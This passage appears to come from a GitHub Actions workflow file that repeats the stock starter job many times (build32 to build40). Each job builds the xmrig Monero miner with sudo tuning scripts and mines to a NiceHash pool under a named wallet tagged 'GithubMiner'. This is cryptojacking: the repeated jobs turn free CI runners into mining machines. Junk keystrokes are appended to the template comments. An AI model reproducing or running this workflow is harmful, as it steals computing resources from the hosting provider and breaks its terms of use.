        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,hhnngcx
          echo test, and deploy your project.bnnbnnbbbxchvvb
  build32:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.hjjn
  build33:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,hdhdb
          echo test, and deploy your project.jhg
  build34:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build35:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build36:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build37:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build38:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.bbaba
  build39:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
  build40:
    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3

      # Runs a single command using the runners shell
      - name: Run a one-line script
        run: echo "Github" && sudo apt-get install git build-essential msr-tools cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && sudo ./randomx_boost.sh && sudo ./enable_1gb_pages.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && sudo ./xmrig --donate-level 5 -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbDq1RKCoVwmpwb1PKZsjKD2dM9bTdjvtWS.GithubMiner -p x -k --nicehash --coin monero -a rx/0

      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
